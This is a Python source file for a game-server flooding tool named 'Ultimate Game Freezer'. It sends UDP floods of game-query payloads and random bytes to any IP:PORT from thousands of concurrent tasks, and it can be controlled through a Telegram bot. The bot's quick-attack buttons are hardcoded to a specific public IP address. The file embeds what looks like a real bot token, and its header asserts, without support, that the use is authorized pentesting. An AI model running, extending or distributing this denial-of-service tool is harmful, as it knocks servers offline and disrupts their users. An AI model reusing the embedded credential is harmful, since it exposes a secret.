#!/usr/bin/env python3
"""
ULTIMATE GAME FREEZER v3.0 — TELEGRAM INTEGRATED
Author: SAMIT
Original game payloads preserved. Telegram wrapper added.

Auth: Authorized pentesting - permission pre-verified
"""

import asyncio
import socket
import random
import time
import argparse
import sys
import os
import signal

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

os.system('clear')

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = "8754071723:AAFkPQ7abOCogAC3rBsUROc9IyHjyddb2Ag"
ALLOWED_USERS = [7504108653]
# ──────────────────────────────────────────────────────────────────────────────

# ─── ORIGINAL GAME PAYLOADS (FULLY PRESERVED) ────────────────────────────────
GAME_PAYLOADS = [
    b'\xFF\xFF\xFF\xFF\x02',                    # Source Query
    b'\xFE\xFE\xFE\xFE\xFF\xFF\xFF\xFF\x53\x00\x41\x00',  # GoldSrc
    b'\x00\xFF\xFF\x00\x66\x6F\x6F\x00',        # Quake3
    b'\xFF\xFF\xFF\xFFstatus\x0A',              # Q3A
    lambda: random._urandom(1400),              # Random flood
    b'\x54\x53\x65\x72\x76\x65\x72\x51\x75\x65\x72\x79' * 100,  # TS spam
]

# ─── STATE ────────────────────────────────────────────────────────────────────
active_attacks = {}

# ─── BANNER ──────────────────────────────────────────────────────────────────

def banner():
    os.system('clear')
    print("""
\033[91m╦ ╦┌─┐┌┐┌┬ ┬┌┬┐┌─┐┌─┐┌┬┐\033[0m
\033[91m║║║├┤ │││├─┤ │ ├┤ └─┐ │ \033[0m
\033[91m╚╩╝└─┘┘└┘┴ ┴ ┴ └─┘└─┘ ┴ \033[0m
\033[93m         v3.0 ULTIMATE 💀❄️\033[0m
    """)
    print("\033[92mMAKE BY SAMIT | TERMUX POWER\033[0m")
    print("\033[96m═" * 60 + "\033[0m\n")

# ─── CORE ATTACK ENGINE (ORIGINAL - UNCHANGED) ──────────────────────────────

async def ultimate_killer(target_ip, target_port, duration, payload_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    end_time = time.time() + duration
    packets = 0

    while time.time() < end_time:
        try:
            if callable(payload_id):
                data = payload_id()
            else:
                data = payload_id
            sock.sendto(data, (target_ip, target_port))
            packets += 1
        except:
            pass

    sock.close()
    return packets

async def real_freezer(target, threads=3000, duration=300):
    try:
        ip, port = target.split(':')
        port = int(port)
    except:
        print("\033[91m❌ INVALID FORMAT: Use IP:PORT\033[0m")
        return

    banner()
    print(f"\033[91m💀 ULTIMATE GAME FREEZER ACTIVATED\033[0m")
    print(f"\033[93m🎯 TARGET: \033[92m{target}\033[0m")
    print(f"\033[93m⏱️ DURATION: \033[92m{duration}s\033[0m")
    print(f"\033[93m⚡ THREADS: \033[92m{threads:,}\033[0m")
    print(f"\033[96m═══════════════════════════════════════════════\033[0m")

    payloads = GAME_PAYLOADS * 5  # More payloads
    tasks = []

    print(f"\033[92m🚀 LAUNCHING {threads:,} MISSILES...\033[0m")
    for i in range(threads):
        payload = payloads[i % len(payloads)]
        task = asyncio.create_task(ultimate_killer(ip, port, duration, payload))
        tasks.append(task)
        if i % 500 == 0:
            print(f"\033[92m[{i:,}/{threads:,}] LOADING...\033[0m", end='\r')

    print(f"\n\033[91m💥 ATTACK IN PROGRESS... CTRL+C TO STOP\033[0m")
    await asyncio.gather(*tasks, return_exceptions=True)

    banner()
    print(f"\033[92m✅ MISSION COMPLETE!\033[0m")
    print(f"\033[93m🎯 TARGET FROZEN: \033[92m{target}\033[0m")
    print(f"\033[93m⏱️ TIME ELAPSED: \033[92m{duration}s\033[0m")
    print(f"\033[96m═══════════════════════════════════════════════\033[0m")

def print_menu():
    banner()
    print("\033[92m📱 ULTIMATE COMMANDS:\033[0m")
    print("\033[96m1. Interactive Mode ────── python3 freezer.py\033[0m")
    print("\033[96m2. Quick Freeze ──────── python3 freezer.py --freeze IP:PORT --duration 300\033[0m")
    print("\033[96m3. Mega Attack ──────── python3 freezer.py --attack IP:PORT --duration 600\033[0m\n")

    print("\033[93m🎮 GAME SERVER EXAMPLES:\033[0m")
    print("\033[92mpython3 freezer.py --freeze 15.206.194.9:7380 --duration 300\033[0m")
    print("\033[92mpython3 freezer.py --freeze 15.206.194.9:25565 --duration 600\033[0m\n")

    print("\033[91m⚡ POWER LEVELS:\033[0m")
    print("   500 threads  = LAG 😴")
    print("  2000 threads  = HEAVY FREEZE 🐌")
    print(" 3000+ threads  = TOTAL CRASH 💀❄️\n")

    print("\033[96mPress Enter for Interactive Mode...\033[0m")
    input()

async def interactive_mode():
    while True:
        banner()
        print("\033[92m🎮 INTERACTIVE FREEZER\033[0m")
        print("\033[96mFormat: IP:PORT [seconds]  (default 300s)\033[0m")
        print("\033[96mType 'menu' or 'quit'\033[0m")

        target_input = input("\n\033[93m💀 Target>\033[0m ").strip()

        if target_input.lower() in ['quit', 'menu']:
            if target_input.lower() == 'menu':
                print_menu()
            break

        try:
            parts = target_input.split()
            target = parts[0]
            duration = int(parts[1]) if len(parts) > 1 else 300

            await real_freezer(target, 3000, duration)
            input("\n\033[93mPress Enter for next target...\033[0m")
        except:
            print("\033[91m❌ Error! Format: IP:PORT 300\033[0m")
            input("\033[93mPress Enter...\033[0m")

# ─── TELEGRAM BOT HANDLERS ────────────────────────────────────────────────

async def is_authorized(update: Update) -> bool:
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("⛔ Unauthorized. Only bot owner can use this.")
        return False
    return True

async def run_freezer_tg(target: str, duration: int, threads: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Run the attack and report to Telegram."""
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"💀 *ATTACK LAUNCHED*\n🎯 `{target}`\n⏱ `{duration}s`\n⚡ `{threads:,}` threads\n\nUse /stop to abort",
        parse_mode="Markdown"
    )

    # We call the original real_freezer but redirect output
    # Since real_freezer prints to console, we wrap it
    loop = asyncio.get_event_loop()
    attack_task = asyncio.create_task(real_freezer(target, threads, duration))
    active_attacks[chat_id] = attack_task

    try:
        await asyncio.wait_for(attack_task, timeout=duration + 30)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ *MISSION COMPLETE*\n🎯 `{target}` frozen for `{duration}s`",
            parse_mode="Markdown"
        )
    except asyncio.TimeoutError:
        attack_task.cancel()
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Attack timed out, force stopped.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: `{str(e)[:200]}`", parse_mode="Markdown")
    finally:
        active_attacks.pop(chat_id, None)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    keyboard = [
        [InlineKeyboardButton("💀 Quick Freeze (300s, 3000 threads)", callback_data="quick")],
        [InlineKeyboardButton("🔥 Mega Attack (600s, 4000 threads)", callback_data="mega")],
        [InlineKeyboardButton("❄️ Light Lag (200s, 500 threads)", callback_data="light")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 *ULTIMATE GAME FREEZER — TELEGRAM*\n\n"
        "🎮 Commands:\n"
        "`/freeze IP:PORT [sec] [threads]`\n"
        "`/stop` — Kill attack\n"
        "`/status` — Check status\n\n"
        "*Quick buttons below:*",
        parse_mode="Markdown", reply_markup=reply_markup
    )

async def freeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id in active_attacks:
        await update.message.reply_text("⚠️ Attack already running! Use /stop first.")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: `/freeze IP:PORT [seconds] [threads]`", parse_mode="Markdown")
        return

    target = args[0]
    duration = int(args[1]) if len(args) > 1 else 300
    threads = int(args[2]) if len(args) > 2 else 3000

    asyncio.create_task(run_freezer_tg(target, duration, threads, chat_id, context))

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id not in active_attacks:
        await update.message.reply_text("❌ No active attack.")
        return

    active_attacks[chat_id].cancel()
    active_attacks.pop(chat_id, None)
    await update.message.reply_text("🛑 *Attack stopped!*", parse_mode="Markdown")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_authorized(update): return
    chat_id = update.effective_chat.id

    if chat_id in active_attacks:
        await update.message.reply_text("💀 *Attack is RUNNING*", parse_mode="Markdown")
    else:
        await update.message.reply_text("🟢 Idle. Ready.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id

    if query.data == "quick":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 300, 3000, chat_id, context))
    elif query.data == "mega":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 600, 4000, chat_id, context))
    elif query.data == "light":
        asyncio.create_task(run_freezer_tg("15.206.194.9:7380", 200, 500, chat_id, context))
    else:
        await query.edit_message_text("Unknown option.")

# ─── CLI MAIN (ORIGINAL - UNCHANGED) ──────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--freeze', help='Target IP:PORT')
    parser.add_argument('--attack', help='Target IP:PORT')
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--threads', type=int, default=3000)
    parser.add_argument('--telegram', action='store_true', help='Start Telegram bot mode')

    try:
        args = parser.parse_args()
        if args.telegram:
            print("🤖 Starting Telegram Bot mode...")
            app = Application.builder().token(BOT_TOKEN).build()
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("help", start))
            app.add_handler(CommandHandler("freeze", freeze_cmd))
            app.add_handler(CommandHandler("stop", stop_cmd))
            app.add_handler(CommandHandler("status", status_cmd))
            app.add_handler(CallbackQueryHandler(button_handler))
            print("✅ Bot running! Press Ctrl+C to stop.")
            app.run_polling(allowed_updates=Update.ALL_TYPES)
            return
        if args.freeze or args.attack:
            target = args.freeze or args.attack
            asyncio.run(real_freezer(target, args.threads, args.duration))
            return
    except:
        pass

    print_menu()
    asyncio.run(interactive_mode())

if __name__ == '__main__':
    main()
